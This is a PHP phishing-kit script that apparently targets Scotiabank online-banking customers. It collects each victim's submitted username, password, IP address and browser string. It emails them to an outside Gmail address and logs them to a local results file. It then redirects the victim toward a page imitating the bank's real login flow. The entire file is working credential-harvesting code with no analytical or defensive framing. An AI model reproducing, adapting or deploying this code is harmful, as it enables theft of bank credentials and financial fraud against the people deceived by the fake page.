<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------1 LoginDetails---------------\n";
$message .= "#USER		: ".$_POST['UN']."\n";
$message .= "#PASS		: ".$_POST['PW']."\n";
$message .= "------created by medpage[679849675]-----------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------SCOTIARESULTS----------------\n";
$send = "crunkcrunk0@gmail.com";
$subject = "scotiaResultz 1 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('scotiaResultz.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script type="text/javascript">
    window.top.location.href = "indexx.html?page=%2Fuser-management%2Fconfirmation&setLng=en&returnURL=https%3A%2F%2Fwww1.scotiaonline.scotiabank.com%2Fonline%2Fauthentication%2Fauthentication.bns%3Flanguage%3DEnglish";

</script>